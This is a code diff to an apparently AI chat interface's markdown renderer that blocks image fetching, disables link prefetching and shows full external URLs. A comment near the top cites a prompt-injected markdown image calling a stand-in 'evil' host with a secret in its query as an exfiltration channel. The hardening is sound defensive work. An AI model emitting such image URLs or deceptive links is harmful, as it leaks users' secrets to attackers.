@@ -18,8 +18,9 @@ import { cn } from "@/lib/utils";
  *   - NO images: an image renders as its alt text, and nothing is ever fetched — a prompt-injected
  *     `![](https://evil/?q=<secret>)` is a known exfiltration channel;
  *   - no mermaid, no wiki-links, no secret chips, no attachment images (a fenced block is only code);
- *   - links go through `classifyLink`: in-app paths use the router, explicit external links open in a
- *     new tab without opener or referrer and show their host, bare URLs are never auto-linked;
+ *   - links go through `classifyLink`: in-app paths use the router (never prefetched), explicit external
+ *     links open in a new tab without opener or referrer and show their FULL destination URL beside the
+ *     text, bare URLs are never auto-linked;
  *   - `<untrusted_content>` wrappers are removed before parsing (the text inside stays plain text).
  */
 
@@ -44,7 +45,11 @@ function ChatLinkView({ href, children }: { href?: string; children?: ReactNode 
   const link = classifyLink(href, textOf(children));
   if (link.kind === "internal") {
     return (
-      <Link href={link.href} className="font-medium text-primary underline underline-offset-2">
+      <Link
+        href={link.href}
+        prefetch={false}
+        className="font-medium text-primary underline underline-offset-2"
+      >
         {children}
       </Link>
     );
@@ -62,7 +67,9 @@ function ChatLinkView({ href, children }: { href?: string; children?: ReactNode 
           {children}
           <span className="sr-only"> ({t("externalLink", { host: link.host })})</span>
         </a>{" "}
-        <span className="font-mono text-xs text-muted-foreground">({link.host})</span>
+        {/* The FULL destination, always visible (security.md §6.1 "Link in chat"): the text of a
+            model-written link can say anything; the URL beside it is what a click sends. */}
+        <span className="font-mono text-xs break-all text-muted-foreground">({link.href})</span>
       </>
     );
   }
